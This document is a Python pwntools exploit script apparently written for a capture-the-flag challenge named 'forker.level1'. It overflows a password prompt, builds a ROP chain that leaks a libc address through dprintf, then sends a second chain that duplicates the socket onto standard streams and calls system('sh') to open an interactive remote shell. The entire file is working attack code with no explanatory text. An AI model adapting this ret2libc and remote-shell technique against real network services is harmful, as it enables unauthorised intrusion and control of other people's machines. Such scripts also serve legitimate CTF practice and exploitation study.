from pwn import *
import time
e = context.binary = ELF('./forker.level1')

debug = 0

if debug == 1:
	libc = ELF('./reverse_libc')
else:
	libc = ELF('./libc-2.26.so')

pop_rdi_ret = 0x400c13
pop_rsi_r15_ret = 0x400c11


puts_offset = libc.symbols['puts']
sys_offset  = libc.symbols['system']
exit_offset = libc.symbols['exit']
sh_offset   = libc.search('sh\x00').next()


libc_base = 0x00

if debug == 1:
	r = remote('192.168.226.129', 31337)
else:
	r = remote('forker1.wpictf.xyz', 31337)


def leak_libc():
	global libc_base

	if debug == 1:
		r = remote('192.168.226.129', 31337)
	else:
		r = remote('forker1.wpictf.xyz', 31337)

	leak  = 'A'*(76)              # offset
	leak += p64(0x4d)               # offset
	leak += 'A'*4
	leak += p64(pop_rdi_ret)
	leak += p64(0x04)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(e.got.puts)     # argument
	leak += p64(0x00)     		# argument
	leak += p64(e.plt.dprintf)     # function_call
	#leak += p64(libc_base + dprintf_offset)     # function_call
	leak += p64(e.plt.exit)    # pop rdi; ret

	r.recvuntil("Password:")
	#time.sleep(10)
	r.sendline(leak)

	puts  = u64(r.recv(6).strip().ljust(8, "\x00"))

	log.success('puts() at %#x', puts)

	libc_base = puts - puts_offset

	log.success('libc_base located at %#x', libc_base)

	r.close()


def exploit():
	global libc

	print hex(libc_base)

	if debug == 1:
		r = remote('192.168.226.129', 31337)
	else:
		r = remote('forker1.wpictf.xyz', 31337)

	system = libc_base + sys_offset
	sh = libc_base + sh_offset
	exit = libc_base + exit_offset

	leak  = 'A'*(76)              # offset
	leak += p64(0x4d)               # offset
	leak += 'A'*4

	dup2_address = libc_base + libc.symbols['dup2']

	leak += p64(pop_rdi_ret)
	leak += p64(4)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(0)
	leak += p64(0x00)
	leak += p64(dup2_address)

	leak += p64(pop_rdi_ret)
	leak += p64(4)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(1)
	leak += p64(0x00)
	leak += p64(dup2_address)

	leak += p64(pop_rdi_ret)
	leak += p64(4)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(2)
	leak += p64(0x00)
	leak += p64(dup2_address)

	leak += p64(pop_rdi_ret) # pop rdi; ret
	leak += p64(sh)          # argument
	leak += p64(system)      # function_call

	r.recvuntil("Password:")

	r.sendline(leak)

	r.interactive()

	r.close()


leak_libc()
exploit()